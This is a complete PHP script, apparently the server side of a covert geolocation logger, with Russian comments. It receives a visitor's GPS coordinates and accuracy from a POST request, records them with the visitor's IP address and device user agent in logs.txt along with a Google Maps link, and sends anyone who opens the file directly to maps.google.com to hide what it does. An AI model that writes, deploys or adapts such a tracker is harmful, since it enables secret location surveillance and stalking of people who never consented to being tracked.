<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Получаем данные из POST запроса
    $lat = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
    $lon = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
    $acc = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
    
    // Собираем системные маркеры
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $date = date('Y-m-d H:i:s');

    // Формируем красивую строку для лога
    $log_entry = "=== НОВЫЙ СТУК: $date ===\n";
    $log_entry .= "IP: $ip\n";
    $log_entry .= "Координаты: $lat, $lon\n";
    $log_entry .= "Точность (в метрах): $acc м\n";
    $log_entry .= "Ссылка на карту: https://www.google.com/maps?q=$lat,$lon\n";
    $log_entry .= "Устройство: $user_agent\n";
    $log_entry .= "=================================\n\n";

    // Записываем данные в файл logs.txt (файл создастся автоматически)
    file_put_contents('logs.txt', $log_entry, FILE_APPEND | LOCK_EX);
    
    echo "OK";
} else {
    // Если кто-то попытается открыть save.php напрямую в браузере
    header("Location: https://maps.google.com");
    exit();
}
?>